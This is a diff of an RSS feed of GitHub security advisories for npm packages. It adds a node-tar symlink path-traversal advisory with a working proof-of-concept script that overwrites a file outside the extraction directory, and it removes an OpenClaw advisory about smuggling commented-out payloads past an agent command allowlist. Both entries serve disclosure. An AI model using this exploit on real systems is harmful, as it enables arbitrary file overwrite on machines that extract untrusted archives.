@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-03-10T23:25:20.317Z</updated>
+    <updated>2026-03-10T23:48:48.438Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,83 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[tar] node-tar Symlink Path Traversal via Drive-Relative Linkpath]]></title>
+        <id>https://github.com/advisories/GHSA-9ppj-qmqm-q256</id>
+        <link href="https://github.com/advisories/GHSA-9ppj-qmqm-q256"/>
+        <updated>2026-03-10T23:44:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>tar</code> (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as <code>C:../../../target.txt</code>, which enables file overwrite outside <code>cwd</code> during normal <code>tar.x()</code> extraction.</p>
+<h3 id="details">Details</h3>
+<p>The extraction logic in <code>Unpack[STRIPABSOLUTEPATH]</code> validates <code>..</code> segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored <code>linkpath</code> to the stripped value.</p>
+<p>What happens with <code>linkpath: "C:../../../target.txt"</code>:</p>
+<ol>
+<li><code>stripAbsolutePath()</code> removes <code>C:</code> and rewrites the value to <code>../../../target.txt</code>.</li>
+<li>The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.</li>
+<li>Symlink creation uses the rewritten value (<code>../../../target.txt</code>) from nested path <code>a/b/l</code>.</li>
+<li>Writing through the extracted symlink overwrites the outside file (<code>../target.txt</code>).</li>
+</ol>
+<p>This is reachable in standard usage (<code>tar.x({ cwd, file })</code>) when extracting attacker-controlled tar archives.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested on Arch Linux with <code>tar@7.5.10</code>.</p>
+<p>PoC script (<code>poc.cjs</code>):</p>
+<pre><code class="language-js">const fs = require('fs')
+const path = require('path')
+const { Header, x } = require('tar')
+
+const cwd = process.cwd()
+const target = path.resolve(cwd, '..', 'target.txt')
+const tarFile = path.join(cwd, 'poc.tar')
+
+fs.writeFileSync(target, 'ORIGINAL\n')
+
+const b = Buffer.alloc(1536)
+new Header({
+  path: 'a/b/l',
+  type: 'SymbolicLink',
+  linkpath: 'C:../../../target.txt',
+}).encode(b, 0)
+fs.writeFileSync(tarFile, b)
+
+x({ cwd, file: tarFile }).then(() =&gt; {
+  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
+  process.stdout.write(fs.readFileSync(target, 'utf8'))
+})
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">node poc.cjs &amp;&amp; readlink a/b/l &amp;&amp; ls -l a/b/l ../target.txt
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">PWNED
+../../../target.txt
+lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -&gt; ../../../target.txt
+.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
+</code></pre>
+<p><code>PWNED</code> confirms outside file content overwrite. <code>readlink</code> and <code>ls -l</code> confirm the extracted symlink points outside the extraction directory.</p>
+<h3 id="impact">Impact</h3>
+<p>This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.</p>
+<p>Realistic scenarios:</p>
+<ul>
+<li>CLI tools unpacking untrusted tarballs into a working directory</li>
+<li>build/update pipelines consuming third-party archives</li>
+<li>services that import user-supplied tar files</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256">https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31802">https://nvd.nist.gov/vuln/detail/CVE-2026-31802</a></li>
+<li><a href="https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad">https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad</a></li>
+<li><a href="https://github.com/advisories/GHSA-9ppj-qmqm-q256">https://github.com/advisories/GHSA-9ppj-qmqm-q256</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9ppj-qmqm-q256</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-10T23:44:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[elysia] Elysia has a string URL format ReDoS]]></title>
         <id>https://github.com/advisories/GHSA-f45g-68q3-5w8x</id>
@@ -1447,43 +1524,5 @@ Parse.Cloud.beforeSubscribe('MyClass', request =&gt; {
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-09T19:54:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: system.run allow-always persistence included shell-commented payload tails]]></title>
-        <id>https://github.com/advisories/GHSA-9q2p-vc84-2rwm</id>
-        <link href="https://github.com/advisories/GHSA-9q2p-vc84-2rwm"/>
-        <updated>2026-03-09T19:54:48.000Z</updated>
-        <content type="html"><![CDATA[<p>OpenClaw's <code>system.run</code> allowlist analysis did not honor POSIX shell comment semantics when deriving <code>allow-always</code> persistence entries.</p>
-<p>A caller in <code>security=allowlist</code> mode who received an <code>allow-always</code> decision could submit a shell command whose tail was commented out at runtime, for example by using an unquoted <code>#</code> before a chained payload. The runtime shell would execute only the pre-comment portion, but allowlist persistence could still analyze and store the non-executed tail as a trusted follow-up command.</p>
-<p>Latest published npm version: <code>2026.3.2</code></p>
-<p>Fixed on <code>main</code> on March 7, 2026 in <code>939b18475d734ed75173f59507e3ebbdfe1992b7</code> by teaching shell tokenization and chain/pipeline analysis to stop at unquoted shell comments, so allow-always persistence now tracks only commands that the shell can actually execute. Normal real chained commands and quoted <code>#</code> literals continue to work.</p>
-<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
-<ul>
-<li>Package: <code>openclaw</code> (npm)</li>
-<li>Affected versions: <code>&lt;= 2026.3.2</code></li>
-<li>Patched version: <code>&gt;= 2026.3.7</code></li>
-</ul>
-<h2 id="fix-commits">Fix Commit(s)</h2>
-<ul>
-<li><code>939b18475d734ed75173f59507e3ebbdfe1992b7</code></li>
-</ul>
-<h2 id="release-process-note">Release Process Note</h2>
-<p>npm <code>2026.3.7</code> was published on March 8, 2026. This advisory is fixed in the released package.</p>
-<p>Thanks @tdjackey for reporting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-9q2p-vc84-2rwm">https://github.com/openclaw/openclaw/security/advisories/GHSA-9q2p-vc84-2rwm</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/939b18475d734ed75173f59507e3ebbdfe1992b7">https://github.com/openclaw/openclaw/commit/939b18475d734ed75173f59507e3ebbdfe1992b7</a></li>
-<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-9q2p-vc84-2rwm">https://github.com/advisories/GHSA-9q2p-vc84-2rwm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9q2p-vc84-2rwm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-09T19:54:46.000Z</published>
     </entry>
 </feed>
